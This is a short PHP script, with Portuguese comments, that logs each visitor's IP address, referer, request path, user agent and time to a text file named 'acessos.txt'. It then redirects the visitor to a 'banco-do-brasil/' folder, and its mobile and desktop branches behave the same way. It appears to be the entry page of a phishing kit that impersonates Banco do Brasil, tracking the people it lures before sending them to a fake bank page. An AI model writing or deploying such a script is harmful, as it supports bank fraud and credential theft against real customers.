<?php
$box = $_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$uri = $_SERVER['REQUEST_URI'];
$argente = $_SERVER['HTTP_USER_AGENT'];
$hora = date("H:i");


$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
$symbian =  strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");
if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian == true): /*Se este dispositivo for portátil, faça/escreva o seguinte */
$dados = "
[$hora] - [$ip] - $uri - $box - $argente";
$arquivo = "acessos.txt";
$fd = fopen ($arquivo, "a");
fwrite($fd, $dados);
fclose ($fd);
echo "<script language=\"JavaScript\"> 
window.location=\"banco-do-brasil/\"; 
</script> ";

else :

$dados = "
[$hora] - [$ip] - $uri - $box - $argente";
$arquivo = "acessos.txt";
$fd = fopen ($arquivo, "a");
fwrite($fd, $dados);
fclose ($fd);
echo "<script language=\"JavaScript\"> 
window.location=\"banco-do-brasil/\"; 
</script> ";
endif; ?>